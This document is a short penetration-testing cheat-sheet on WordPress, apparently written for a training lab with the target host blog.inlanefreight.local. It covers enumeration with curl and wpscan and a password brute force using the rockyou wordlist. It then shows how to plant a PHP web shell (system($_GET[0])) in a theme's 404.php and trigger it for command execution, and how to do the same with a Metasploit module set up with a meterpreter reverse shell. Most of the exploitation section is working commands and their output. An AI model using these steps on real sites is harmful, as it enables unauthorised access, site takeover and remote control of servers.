## Wordpress

### Enumeration
Interesting files :

```bash
/robots.txt
/wp-sitemap.xml
/wp-admin/admin-ajax.php
/wp-login.php
wp-content/plugins
wp-content/themes
```

Interesting commands :

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
wpscan --url http://blog.inlanefreight.local --enumerate --api-token <API_TOKEN>
# Bruteforce
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Exploitation

- Check for vulnerable plugins

As admin We can edit 404.php file from a theme as a reverse shell (and get RCE) 

Editing (for example) : 

```bash
http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
```

Add :
```php
system($_GET[0]);
# or https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Trigger : 
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Same steps using metasploit : 
```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost $tun0
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost $target_ip  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST vhost (if needed)
```